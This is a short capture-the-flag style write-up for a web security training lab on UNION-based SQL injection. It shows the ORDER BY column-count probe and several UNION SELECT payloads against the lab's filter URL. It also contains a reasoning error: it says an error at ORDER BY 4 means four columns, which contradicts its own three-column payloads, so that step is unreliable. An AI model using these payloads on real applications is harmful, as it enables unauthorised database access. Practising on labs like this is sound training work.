# Finding a Column Containing Text

### Objective

- Determine the number of columns returned in the server's response
- Determine which columns contains a string data type
- Return an additional row containing a string provided in a `UNION SELECT` statement

### Solution

To determine the number of columns returned in the response, make the following request to the server while incrementing the value of the `ORDER BY` clause until
an internal server error is returned:

```
https://<burp-subdomain>.web-security-academy.net/filter?category=Accessories' ORDER BY 1-- -
```

Using `ORDER BY 4-- -` returns the internal server error, so we know there are 4 columns being returned. Next, we can determine which column contains text data
by using the following SQL payloads:

```
' UNION SELECT 'a',NULL,NULL-- -
' UNION SELECT NULL,'a',NULL-- -
' UNION SELECT NULL,NULL,'a'-- -
```

An error will occur when the `'a'` has been specified in a column where text data is not compatible with the returned data type. The working payload is:

```
' UNION SELECT NULL,'a',NULL-- -
```

Use the payload above to return the string specified in the labs home page, like this:

```
' UNION SELECT NULL,'3HRR3g',NULL-- -
```
